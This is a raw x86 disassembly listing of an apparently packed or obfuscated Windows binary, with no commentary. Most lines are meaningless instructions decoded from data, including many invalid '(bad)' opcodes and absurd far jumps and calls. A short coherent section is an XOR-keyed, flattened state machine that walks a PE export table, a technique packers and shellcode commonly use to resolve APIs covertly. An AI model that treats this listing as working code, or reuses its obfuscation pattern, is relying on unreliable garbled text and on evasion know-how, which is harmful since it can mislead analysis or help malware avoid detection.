  408c32:	sbb    ecx,ebx
  408c34:	jp     0x408c21
  408c36:	pop    edi
  408c37:	retf   
  408c38:	clc    
  408c39:	sbb    ecx,0x33
  408c3c:	xchg   BYTE PTR [edi-0x70],dl
  408c3f:	mul    DWORD PTR [ecx+0x6624f971]
  408c45:	in     al,dx
  408c46:	xchg   edi,eax
  408c47:	sub    eax,0xa6dd79a4
  408c4c:	and    DWORD PTR [edx+0x6d],0x79678d64
  408c53:	mov    eax,ds:0xb66ebb0
  408c58:	idiv   al
  408c5a:	mov    WORD PTR [eax],?
  408c5c:	test   eax,0x14fdcbc2
  408c61:	repz xor eax,0xf7478ffe
  408c67:	jo     0x408c6c
  408c69:	aad    0xa6
  408c6b:	push   esp
  408c6c:	mov    edx,0xaf013a6b
  408c71:	outs   dx,DWORD PTR ds:[esi]
  408c72:	pop    ecx
  408c73:	(bad)  
  408c74:	dec    eax
  408c75:	ins    BYTE PTR es:[edi],dx
  408c76:	std    
  408c77:	push   ebp
  408c78:	(bad)  [edx]
  408c7a:	lahf   
  408c7b:	adc    edx,DWORD PTR [eax]
  408c7d:	stc    
  408c7e:	dec    ebp
  408c7f:	(bad)  
  408c80:	(bad)  
  408c81:	out    dx,al
  408c82:	cwde   
  408c83:	arpl   WORD PTR [eax+0x4acb294d],di
  408c89:	inc    ebp
  408c8a:	xor    al,0x32
  408c8c:	jle    0x408c5e
  408c8e:	retf   
  408c8f:	rcl    DWORD PTR [esi+eax*8],0x48
  408c93:	ins    BYTE PTR es:[edi],dx
  408c94:	call   edx
  408c96:	sbb    DWORD PTR [eax+0x17],esi
  408c99:	outs   dx,DWORD PTR ds:[esi]
  408c9a:	popa   
  408c9b:	adc    cl,al
  408c9d:	add    DWORD PTR [ebp+0x12],eax
  408ca0:	lods   al,BYTE PTR ds:[esi]
  408ca1:	push   0xc30d053e
  408ca6:	fs mov bl,0x83
  408ca9:	mov    esi,0xabe5a234
  408cae:	inc    eax
  408caf:	sub    BYTE PTR [ecx+0x1a],0xd7
  408cb3:	ins    DWORD PTR es:[edi],dx
  408cb4:	and    DWORD PTR [edi-0x72160c7f],ebp
  408cba:	out    dx,eax
  408cbb:	push   cs
  408cbc:	and    DWORD PTR [edi],ecx
  408cbe:	xor    BYTE PTR [ebp-0x175d7e],dh
  408cc4:	or     eax,0xd061e815
  408cc9:	rcl    BYTE PTR [edx],cl
  408ccb:	xor    esp,DWORD PTR [ebx-0x6d]
  408cce:	mov    gs,WORD PTR [esi-0x78f2b214]
  408cd4:	jo     0x408d17
  408cd6:	lods   eax,DWORD PTR ds:[esi]
  408cd7:	mov    bh,0x38
  408cd9:	inc    cx
  408cdb:	in     eax,dx
  408cdc:	sbb    esi,ebp
  408cde:	pop    es
  408cdf:	ret    
  408ce0:	rcl    BYTE PTR [ebx],cl
  408ce2:	ret    0x129c
  408ce5:	jae    0x408d27
  408ce7:	sti    
  408ce8:	mov    esp,0x161f6dcb
  408ced:	xchg   ebp,eax
  408cee:	mov    esp,0xc15c01aa
  408cf3:	je     0x408d0a
  408cf5:	fsub   QWORD PTR [edx+edi*2+0x15]
  408cf9:	scas   eax,DWORD PTR es:[edi]
  408cfa:	cmp    ch,BYTE PTR [edx-0x41161fb0]
  408d00:	cli    
  408d01:	data16 add BYTE PTR [ecx+0x2b],al
  408d05:	rcr    edi,cl
  408d07:	jge    0x408cd1
  408d09:	inc    edx
  408d0a:	jno    0x408d31
  408d0c:	in     al,dx
  408d0d:	(bad)  
  408d0e:	dec    edi
  408d0f:	xchg   esi,eax
  408d10:	lds    edi,FWORD PTR [edx-0xd]
  408d13:	imul   DWORD PTR [ecx+0x56]
  408d16:	jnp    0x408cc4
  408d18:	sub    cl,BYTE PTR [ecx]
  408d1a:	dec    esi
  408d1b:	jmp    0xe315611
  408d20:	(bad)  
  408d21:	cmc    
  408d22:	or     al,0x7
  408d24:	cld    
  408d25:	pop    ds
  408d26:	arpl   WORD PTR [esi-0x4b],dx
  408d29:	push   esp
  408d2a:	clc    
  408d2b:	and    BYTE PTR [edx],0xe6
  408d2e:	xchg   edx,eax
  408d2f:	and    eax,0x87517b1c
  408d34:	sub    ah,ch
  408d36:	and    eax,0xe93e3d7d
  408d3b:	fist   DWORD PTR [eax+esi*8]
  408d3e:	xchg   DWORD PTR [ecx+0x57],ecx
  408d41:	call   0x4e24:0xb33d5535
  408d48:	mov    ss,WORD PTR ds:0x2486be1a
  408d4e:	call   0x681bc9c9
  408d53:	adc    cl,dh
  408d55:	ins    BYTE PTR es:[edi],dx
  408d56:	pop    es
  408d57:	sbb    al,0x23
  408d59:	sub    eax,0x1e8cf453
  408d5e:	icebp  
  408d5f:	jne    0x408d58
  408d61:	mov    ch,0x43
  408d63:	push   edi
  408d64:	fsub   DWORD PTR [edx+0x2]
  408d67:	xchg   ebx,eax
  408d68:	cs lahf 
  408d6a:	xchg   ecx,eax
  408d6b:	mov    edx,0xe56b7a7e
  408d70:	or     BYTE PTR [ebx+0x6d],dl
  408d73:	arpl   WORD PTR [ebx+0x15],cx
  408d76:	or     BYTE PTR [ebx+0x6e421f5c],dh
  408d7c:	ror    DWORD PTR [ecx],0x80
  408d7f:	cmc    
  408d80:	add    eax,0xbb48ae42
  408d85:	dec    esp
  408d86:	or     eax,0x3d65fa6a
  408d8b:	adc    eax,0x9edd30ea
  408d90:	arpl   sp,dx
  408d92:	push   ebp
  408d93:	test   DWORD PTR [eax-0x1],0xabc172b3
  408d9a:	in     eax,0xc6
  408d9c:	xor    al,BYTE PTR [ecx+0x1c]
  408d9f:	daa    
  408da0:	(bad)  
  408da1:	iret   
  408da2:	fisubr WORD PTR [edx]
  408da4:	in     eax,0x6e
  408da6:	inc    ebp
  408da7:	cmp    bh,al
  408da9:	xchg   BYTE PTR [esi-0x6b14ac42],al
  408daf:	add    eax,0xae546618
  408db4:	jge    0x408d78
  408db6:	jg     0x408d94
  408db8:	cli    
  408db9:	cmp    ebx,edx
  408dbb:	xor    BYTE PTR [eax-0x4b],0xb8
  408dbf:	js     0x408d7d
  408dc1:	mov    DWORD PTR [ecx],esp
  408dc3:	mov    eax,ds:0xba2e0b43
  408dc8:	mov    ds:0x55eb7646,eax
  408dcd:	and    edi,DWORD PTR [ebp-0xdb052f0]
  408dd3:	iret   
  408dd4:	push   cs
  408dd5:	lds    esp,FWORD PTR [ecx]
  408dd7:	(bad)  
  408dd8:	sub    eax,0xb7d575d
  408ddd:	jle    0x408df8
  408ddf:	lds    edx,FWORD PTR [ebx+eiz*1-0x45]
  408de3:	sti    
  408de4:	inc    eax
  408de5:	cli    
  408de6:	xor    esi,ebp
  408de8:	scas   al,BYTE PTR es:[edi]
  408de9:	inc    eax
  408dea:	push   0x7c
  408dec:	js     0x408e2e
  408dee:	sbb    dl,BYTE PTR [edi-0x8785c00]
  408df4:	fwait
  408df5:	outs   dx,BYTE PTR ds:[esi]
  408df6:	jl     0x408dd0
  408df8:	scas   eax,DWORD PTR es:[edi]
  408df9:	mov    al,ds:0x9fc0bcd
  408dfe:	inc    esi
  408dff:	push   ecx
  408e00:	jne    0x408dd2
  408e02:	xchg   edx,eax
  408e03:	mov    ebp,0xb715cf87
  408e08:	rcr    cl,cl
  408e0a:	xor    BYTE PTR [ecx-0x24],dh
  408e0d:	inc    esi
  408e0e:	mov    al,ds:0x8fa4e83c
  408e13:	ffreep st(3)
  408e15:	xchg   ecx,eax
  408e16:	fwait
  408e17:	cmc    
  408e18:	and    esi,ebp
  408e1a:	push   0xffffffe0
  408e1c:	mov    ds:0xae708ec5,eax
  408e21:	icebp  
  408e22:	adc    eax,0x661573a5
  408e27:	mov    eax,DWORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0xba3fd2f3
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	jnp    0x408e7f
  408ec6:	lods   al,BYTE PTR ds:[esi]
  408ec7:	mov    WORD PTR [esi],gs
  408ec9:	outs   dx,BYTE PTR ds:[esi]
  408eca:	xchg   esp,eax
  408ecb:	lea    ebp,[ecx+0x3e]
  408ece:	sub    eax,0x1df654d9
  408ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ed4:	pop    es
  408ed5:	sbb    ah,BYTE PTR [edx-0x2c]
  408ed8:	xchg   edi,eax
  408ed9:	cdq    
  408eda:	pop    esi
  408edb:	pop    edi
  408edc:	mov    ecx,0xddccd675
  408ee1:	and    al,0xf1
  408ee3:	out    0x4d,eax
  408ee5:	shr    eax,0xbf
  408ee8:	rcl    bh,0xb3
  408eeb:	pushf  
  408eec:	sbb    eax,0x7bef1540
  408ef1:	pushf  
  408ef2:	std    
  408ef3:	cs sar edi,1
  408ef6:	mov    dh,0x21
  408ef8:	retf   
  408ef9:	mov    ds:0xf74e45f1,eax
  408efe:	mov    ebx,0xb07120c0
  408f03:	daa    
  408f04:	or     DWORD PTR [ebx],ebx
  408f06:	jl     0xac86e572
  408f0c:	test   BYTE PTR [ebx+0x8],dl
  408f0f:	fsub   DWORD PTR [ebp+ecx*2+0x2e]
  408f13:	out    0x44,eax
  408f15:	xchg   edi,eax
  408f16:	loopne 0x408ea9
  408f18:	push   ebx
  408f19:	lods   eax,DWORD PTR ds:[esi]
  408f1a:	pop    esp
  408f1b:	push   edi
  408f1c:	jg     0x408efe
  408f1e:	(bad)  
  408f1f:	arpl   bx,dx
  408f21:	jb     0x408f3f
  408f23:	add    al,0x5
  408f25:	mov    dh,0x41
  408f27:	les    ecx,FWORD PTR [edi+0x4a5410e9]
  408f2d:	dec    esi
  408f2e:	or     eax,0x5d93f5e
  408f33:	cmc    
  408f34:	or     eax,0xff9c1c46
  408f39:	ds inc ebx
  408f3b:	bound  ebp,QWORD PTR [eax+0x523a6838]
  408f41:	jne    0x408fb1
  408f43:	hlt    
  408f44:	inc    edi
  408f45:	fsub   QWORD PTR [eax-0x13]
  408f48:	and    DWORD PTR [eax+eiz*4-0x42e5771],ebx
  408f4f:	daa    
  408f50:	xor    ah,BYTE PTR [edx-0x2e]
  408f53:	pop    ebx
  408f54:	es add dl,al
  408f57:	xor    DWORD PTR [edx],0xb8f4b9bd
  408f5d:	gs xor al,0x52
  408f60:	repz std 
  408f62:	ss mov eax,0xdf91b8d0
  408f68:	stos   BYTE PTR es:[edi],al
  408f69:	jmp    FWORD PTR ds:0x3958f3ae
  408f6f:	mov    ch,BYTE PTR [edx+0x75c724e3]
  408f75:	stos   BYTE PTR es:[edi],al
  408f76:	inc    edx
  408f77:	xor    DWORD PTR [esi+0x35311187],0x36984518
  408f81:	xor    al,0x4b
  408f83:	jae    0x408fcc
  408f85:	adc    BYTE PTR [edx+0x21],dh
  408f88:	mov    edi,0x9f2a16e4
  408f8d:	stos   DWORD PTR es:[edi],eax
  408f8e:	sti    
  408f8f:	and    eax,0x310ecf4c
  408f94:	xlat   BYTE PTR ds:[ebx]
  408f95:	jne    0x408fe0
  408f97:	hlt    
  408f98:	or     eax,ecx
  408f9a:	xor    al,0xcd
  408f9c:	push   0xa28dcc27
  408fa1:	imul   edi,DWORD PTR [ebx+0x6b],0x7f
  408fa5:	iret   
  408fa6:	or     DWORD PTR [edx+0x2],ebx
  408fa9:	inc    esp
  408faa:	fxch   st(3)
  408fac:	daa    
  408fad:	push   ecx
  408fae:	out    dx,eax
  408faf:	jnp    0x408f80
  408fb1:	lods   al,BYTE PTR ds:[esi]
  408fb2:	and    edi,DWORD PTR ds:0xe8e91e9a
  408fb8:	push   ss
  408fb9:	or     eax,esp
  408fbb:	test   BYTE PTR [eax-0x2b],al
  408fbe:	fstp   DWORD PTR [edi]
  408fc0:	inc    edi
  408fc1:	nop
  408fc2:	xchg   esp,eax
  408fc3:	jbe    0x408fdf
  408fc5:	or     DWORD PTR [esi],ebp
  408fc7:	jecxz  0x40901d
  408fc9:	sub    BYTE PTR [edi+0x6b38002],bh
  408fcf:	ret    
  408fd0:	ins    DWORD PTR es:[edi],dx
  408fd1:	add    eax,0xd27ce016
  408fd6:	and    al,0xab
  408fd8:	xor    dh,dl
  408fda:	xlat   BYTE PTR ds:[ebx]
  408fdb:	rol    ecx,1
  408fdd:	test   BYTE PTR [edi],dl
  408fdf:	xor    esp,DWORD PTR [ebp-0x2f877d11]
  408fe5:	or     ebx,DWORD PTR [edi-0x61]
  408fe8:	jmp    0xb43b72b
  408fed:	jle    0x408f95
  408fef:	and    dl,BYTE PTR [eax-0x70]
  408ff2:	or     dl,BYTE PTR [edx-0x764909a9]
  408ff8:	icebp  
  408ff9:	fisttp WORD PTR [esi+ecx*8-0x2a2b55ac]
  409000:	add    edi,esi
  409002:	data16 adc BYTE PTR [ebp-0x29],dl
  409006:	leave  
  409007:	pop    es
  409008:	scas   al,BYTE PTR es:[edi]
  409009:	ret    
  40900a:	imul   esp,DWORD PTR [ecx+0xf],0xc4380eff
  409011:	mov    ds:0xd37dc06b,al
  409016:	xchg   edi,eax
  409017:	stc    
  409018:	push   0x1b
  40901a:	arpl   WORD PTR [edx+0x53],si
  40901d:	sub    al,0x28
  40901f:	mov    ebp,0x89580350
  409024:	enter  0x1260,0xf6
  409028:	cli    
  409029:	jns    0x408fb1
  40902b:	cwde   
  40902c:	push   cs
  40902d:	push   es
  40902e:	push   0x7d
  409030:	xor    al,0x9c
  409032:	scas   al,BYTE PTR es:[edi]
  409033:	inc    BYTE PTR [esi]
  409035:	mov    dh,0x7b
  409037:	icebp  
  409038:	add    BYTE PTR [esi+0x648560ee],cl
  40903e:	imul   ecx,DWORD PTR [eax+0x678615f8],0xe6c17f44
  409048:	adc    al,0x4f
  40904a:	sbb    BYTE PTR [eax],al
  40904c:	retf   
  40904d:	add    cl,0x25
  409050:	fs jmp 0x55bb:0x651445ac
  409058:	lods   al,BYTE PTR ds:[esi]
  409059:	cdq    
  40905a:	jo     0x409019
  40905c:	inc    esi
  40905d:	ficom  DWORD PTR [eax+0x6d2aeddd]
  409063:	cmp    al,0x8
  409065:	enter  0xdb12,0x9b
  409069:	in     al,0x6f
  40906b:	push   edi
  40906c:	add    ch,ch
  40906e:	popa   
  40906f:	xchg   ebp,eax
  409070:	mov    eax,0x6b92586c
  409075:	dec    esp
  409076:	push   esi
  409077:	cmp    eax,0x56589017
  40907c:	xchg   esi,eax
  40907d:	pop    ebp
  40907e:	mov    ebp,0xd6cd818d
  409083:	push   cs
  409084:	ins    BYTE PTR es:[edi],dx
  409085:	push   eax
  409086:	dec    esp
  409087:	shl    cl,cl
  409089:	cmp    eax,DWORD PTR [eax]
  40908b:	imul   esp,ebx,0x86e7521c
  409091:	xchg   ebx,eax
  409092:	pushf  
  409093:	stos   DWORD PTR es:[edi],eax
  409094:	jge    0x40907d
  409096:	loopne 0x409020
  409098:	push   cs
  409099:	rcr    ebp,1
  40909b:	mov    dl,0x2f
  40909d:	pop    es
  40909e:	mov    ds:0xb3a3784b,al
  4090a3:	adc    al,0x6
  4090a5:	jp     0x4090f4
  4090a7:	mov    ch,ah
  4090a9:	cmp    cl,BYTE PTR [esi-0x75e10cc7]
  4090af:	sahf   
  4090b0:	mov    ?,WORD PTR [eax+0x24]
  4090b3:	test   al,0xe8
  4090b5:	cs dec edx
  4090b7:	ret    0xadca
  4090ba:	imul   ebp,DWORD PTR [ecx],0x3eb38461
  4090c0:	test   eax,0x7cd6f769
  4090c5:	jnp    0x40913c
  4090c7:	xchg   ebx,eax
  4090c8:	(bad)  
  4090c9:	adc    ecx,DWORD PTR [ecx-0x254f7446]
  4090cf:	adc    DWORD PTR [eax+0x6dc1bf78],esi
  4090d5:	jl     0x409133
  4090d7:	mov    dh,0x9c
  4090d9:	xor    ecx,DWORD PTR [ebx-0x78]
  4090dc:	fnsave [ecx+0x43d02562]
  4090e2:	inc    ebx
  4090e3:	push   ecx
  4090e4:	enter  0xbcd6,0x26
  4090e8:	test   BYTE PTR [ebx+ecx*4-0x6f],bl
  4090ec:	inc    esi
  4090ed:	add    BYTE PTR [ebx],dh
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x3b
  409163:	(bad)  
  409164:	data16 mov dl,0x32
  409167:	fistp  QWORD PTR [esi+0x7e]
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	fidiv  WORD PTR [edx-0x335307ff]
  409174:	add    al,al
  409176:	shr    esp,cl
  409178:	repnz das 
  40917a:	ror    BYTE PTR [ecx-0x1b],1
  40917d:	push   eax
  40917e:	out    dx,al
  40917f:	(bad)  
  409180:	mov    dh,0x63
  409182:	aaa    
  409183:	hlt    
  409184:	jae    0x409150
  409186:	out    dx,al
  409187:	adc    al,0x7
  409189:	cmp    eax,0xb09fd09d
  40918e:	mov    ds:0x9babb332,eax
  409193:	stos   BYTE PTR es:[edi],al
  409194:	gs and esi,edi
  409197:	mov    edi,0x2e449564
  40919c:	adc    eax,0x40ea4e3a
  4091a1:	popf   
  4091a2:	cmp    eax,0x50efd4c9
  4091a7:	loop   0x40912a
  4091a9:	das    
  4091aa:	jnp    0x40913b
  4091ac:	jp     0x4091b2
  4091ae:	xchg   esi,eax
  4091af:	adc    ebx,DWORD PTR [edi]
  4091b1:	sbb    al,0x3c
  4091b3:	rcl    bh,cl
  4091b5:	cmp    BYTE PTR [esi-0x3643852d],bl
  4091bb:	ins    BYTE PTR es:[edi],dx
  4091bc:	mov    eax,ds:0x94fcd0cb
  4091c1:	cs aad 0xad
  4091c4:	dec    ebx
  4091c5:	dec    edx
  4091c6:	ror    BYTE PTR ds:0x3efde678,1
  4091cc:	fcmovnb st,st(7)
  4091ce:	pop    es
  4091cf:	jne    0x4091b2
  4091d1:	sub    eax,0xd596a8dc
  4091d6:	test   bh,ch
  4091d8:	dec    ecx
  4091d9:	jmp    0xc71de10b
  4091de:	rol    bh,cl
  4091e0:	aam    0x36
  4091e2:	gs enter 0xfa73,0xd0
  4091e7:	adc    BYTE PTR [eax],dl
  4091e9:	mov    cl,0x34
  4091eb:	aaa    
  4091ec:	sbb    esi,ebp
  4091ee:	xlat   BYTE PTR ds:[ebx]
  4091ef:	xchg   BYTE PTR [ecx-0x640c2c6f],dh
  4091f5:	enter  0x8b76,0x1b
  4091f9:	js     0x4091c2
  4091fb:	fs adc al,0x23
  4091fe:	add    ebp,DWORD PTR [ebx+0x45]
  409201:	hlt    
  409202:	add    DWORD PTR [eax+0x13],esp
  409205:	push   ss
  409206:	mul    cl
  409208:	(bad)  
  409209:	mov    al,ds:0xeadc00bb
  40920e:	jo     0x409222
  409210:	repnz pusha 
  409212:	repz dec esp
  409214:	fsubr  DWORD PTR [ebx+ebp*4-0x3d068115]
  40921b:	lahf   
  40921c:	push   ss
  40921d:	cmp    edx,edi
  40921f:	aam    0x39
  409221:	push   esi
  409222:	xchg   ebx,eax
  409223:	dec    ebx
  409224:	cmc    
  409225:	icebp  
  409226:	ins    DWORD PTR es:[edi],dx
  409227:	ror    BYTE PTR [esi+0x69],0xd
  40922b:	and    ebx,ebx
  40922d:	aas    
  40922e:	sbb    ebp,ebx
  409230:	sub    esp,esi
  409232:	xor    DWORD PTR [ebp-0xce6afc1],eax
  409238:	or     DWORD PTR [edi+0x2b],esp
  40923b:	popf   
  40923c:	hlt    
  40923d:	imul   ecx,DWORD PTR [ecx+0x67fc01f1],0xffffffc4
  409244:	dec    ebp
  409245:	xlat   BYTE PTR ds:[ebx]
  409246:	sbb    al,0x48
  409248:	(bad)  
  409249:	mov    dh,0x49
  40924b:	inc    edi
  40924c:	fist   WORD PTR [ecx]
  40924e:	hlt    
  40924f:	cwde   
  409250:	popa   
  409251:	std    
  409252:	sub    BYTE PTR [ecx+0x70],0xf8
  409256:	test   al,dl
  409258:	loope  0x40925a
  40925a:	out    0x10,eax
  40925c:	jnp    0x4092a7
  40925e:	call   0x228:0xaa96a9a8
  409265:	pop    edx
  409266:	add    BYTE PTR [edx],dh
  409268:	pop    edx
  409269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40926a:	iret   
  40926b:	inc    esp
  40926c:	inc    ebx
  40926d:	xchg   edx,eax
  40926e:	cmp    ah,ah
  409270:	pop    es
  409271:	jg     0x409209
  409273:	aaa    
  409274:	jg     0x40927b
  409276:	cmp    BYTE PTR [edx],cl
  409278:	enter  0x2ee0,0xf0
  40927c:	(bad)  
  40927d:	aam    0x52
  40927f:	rcr    BYTE PTR [esi-0x47],0x33
  409283:	sub    eax,0x1349f9ee
  409288:	adc    ecx,DWORD PTR [esi+esi*4]
  40928b:	aad    0xdb
  40928d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40928e:	inc    ebp
  40928f:	pop    ecx
  409290:	lds    edi,FWORD PTR [eax+edi*8+0x67]
  409294:	xor    esi,DWORD PTR [esi-0x11]
  409297:	mov    bl,0x82
  409299:	adc    bl,BYTE PTR [eax-0x6e]
  40929c:	shl    BYTE PTR ds:0x9ae178b,cl
  4092a2:	ins    DWORD PTR es:[edi],dx
  4092a3:	leave  
  4092a4:	mov    bl,0xb
  4092a6:	and    DWORD PTR [ebp+esi*4+0x44bf4ad0],ebx
  4092ad:	add    ecx,DWORD PTR [edx+ecx*4-0x68759e69]
  4092b4:	push   es
  4092b5:	xor    DWORD PTR [edx+0x3a],esp
  4092b8:	mov    edx,0x33642a55
  4092bd:	mov    edx,0x6487929c
  4092c2:	loope  0x4092b4
  4092c4:	(bad)  
  4092c5:	dec    esi
  4092c6:	fidivr DWORD PTR [esi]
  4092c8:	inc    esi
  4092c9:	rcl    BYTE PTR [ebx],1
  4092cb:	jmp    0x6cec4d84
  4092d0:	aaa    
  4092d1:	sbb    al,0xb0
  4092d3:	retf   0xde9a
  4092d6:	xor    DWORD PTR ds:0xaceeb911,edx
  4092dc:	or     al,BYTE PTR [ecx]
  4092de:	sub    edi,esp
  4092e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092e1:	leave  
  4092e2:	(bad)  
  4092e3:	iret   
  4092e4:	js     0x40935d
  4092e6:	(bad)  
  4092e7:	mov    esi,0x43b8b8dd
  4092ec:	(bad)  
  4092ed:	shl    BYTE PTR [edx+0x13],0x20
  4092f1:	adc    al,0x57
  4092f3:	inc    eax
  4092f4:	es xor eax,0x47167365
  4092fa:	mov    al,ds:0x92399cf1
  4092ff:	sbb    eax,0xf9e60386
  409304:	test   ebp,ecx
  409306:	ret    
  409307:	lods   al,BYTE PTR ds:[esi]
  409308:	int3   
  409309:	mov    DWORD PTR [eax+0x50],ebx
  40930c:	cmp    BYTE PTR [ecx+edx*4+0xe],ch
  409310:	ficom  WORD PTR [edx-0x76]
  409313:	imul   ebx,DWORD PTR [edx+0x35],0x25046cd7
  40931a:	outs   dx,DWORD PTR ds:[esi]
  40931b:	out    dx,al
  40931c:	fwait
  40931d:	push   ebx
  40931e:	dec    eax
  40931f:	out    dx,eax
  409320:	lods   eax,DWORD PTR ds:[esi]
  409321:	rol    eax,cl
  409323:	xchg   edx,eax
  409324:	mov    BYTE PTR [ecx-0x33a1ea4a],ah
  40932a:	ss in  eax,dx
  40932c:	stos   DWORD PTR es:[edi],eax
  40932d:	fld    TBYTE PTR [ebp-0x5f1ea713]
  409333:	mov    ebp,0xdd5c5912
  409338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409339:	fwait
  40933a:	adc    BYTE PTR [ebx-0x252b43cb],dh
  409340:	(bad)  
  409341:	ja     0x409384
  409343:	or     BYTE PTR [esi],dh
  409345:	jns    0x4092dc
  409347:	adc    ecx,0xb8710c16
  40934d:	sub    al,0xc5
  40934f:	mov    ch,0xe2
  409351:	popf   
  409352:	inc    ebx
  409353:	jl     0x4093b4
  409355:	xchg   esp,eax
  409356:	cwde   
  409357:	adc    ebp,0xfae976e6
  40935d:	inc    ebp
  40935e:	xchg   DWORD PTR [esp+ebx*8-0x7f0b9a27],ebx
  409365:	popa   
  409366:	addr16 popf 
  409368:	inc    esp
  409369:	and    ah,BYTE PTR [ecx]
  40936b:	add    BYTE PTR [ebp+0x68e7e3a4],ch
  409371:	jnp    0x4093b9
  409373:	xchg   esp,eax
  409374:	adc    edi,DWORD PTR [edx]
  409376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409377:	xchg   ebx,eax
  409378:	xor    BYTE PTR [edx],0x0
  40937b:	ret    
  40937c:	loope  0x4093da
  40937e:	clc    
  40937f:	enter  0x31fb,0xe6
  409383:	sahf   
  409384:	or     BYTE PTR [edi],ch
  409386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409387:	pop    ss
  409388:	mov    bl,0x63
  40938a:	mov    esp,0x3b3eb212
  40938f:	cwde   
  409390:	leave  
  409391:	pop    eax
  409392:	and    eax,0x49d2c26
  409397:	js     0x409322
  409399:	or     BYTE PTR [ebx+0x458b0c45],cl
  40939f:	or     bh,bh
  4093a1:	jne    0x40939b
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	popf   
  4093b5:	lea    edi,[eax+0x7eddd8b7]
  4093bb:	jle    0x4093e1
  4093bd:	jl     0x40943d
  4093bf:	jle    0x409415
  4093c1:	adc    ebp,DWORD PTR [edx-0x66f215ab]
  4093c7:	scas   al,BYTE PTR es:[edi]
  4093c8:	out    dx,eax
  4093c9:	fldenv [esi]
  4093cb:	inc    ecx
  4093cc:	not    edi
  4093ce:	call   0xe819:0xf2d52ea0
  4093d5:	icebp  
  4093d6:	or     ebx,ecx
  4093d8:	stos   DWORD PTR es:[edi],eax
  4093d9:	xor    ebp,DWORD PTR [edi+0x6c]
  4093dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093dd:	jb     0x40941c
  4093df:	push   ds
  4093e0:	or     eax,0xcc95e76d
  4093e5:	xchg   ebp,eax
  4093e6:	push   0x3459ea72
  4093eb:	jle    0x4093ea
  4093ed:	sahf   
  4093ee:	pop    eax
  4093ef:	dec    esi
  4093f0:	mov    cs,WORD PTR [ebx+0x3088563d]
  4093f6:	cmp    edi,DWORD PTR [ecx]
